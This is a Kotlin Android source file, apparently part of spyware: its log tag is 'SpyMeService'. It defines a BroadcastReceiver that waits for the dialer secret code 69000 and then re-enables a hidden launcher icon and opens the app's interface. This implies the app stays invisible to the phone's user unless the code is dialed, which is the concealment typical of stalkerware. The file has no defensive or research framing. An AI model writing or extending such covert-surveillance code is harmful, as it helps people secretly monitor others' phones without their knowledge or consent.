package com.anonymous.scure_beat

import android.content.BroadcastReceiver
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.util.Log

class DialerReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        val action = intent.action
        val host = intent.data?.host
        
        Log.d("SpyMeService", "Dialer action received: $action, host: $host")
        
        if (action == "android.provider.Telephony.SECRET_CODE" && host == "69000") {
            Log.d("SpyMeService", "Secret code matched! Restoring UI...")

            // 1. Restore the app icon (unhide it)
            val aliasName = ComponentName(context, "com.anonymous.scure_beat.LauncherAlias")
            context.packageManager.setComponentEnabledSetting(
                aliasName,
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            )

            // 2. Launch the main UI Activity
            val launchIntent = Intent(context, MainActivity::class.java).apply {
                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP
            }
            context.startActivity(launchIntent)
        }
    }
}
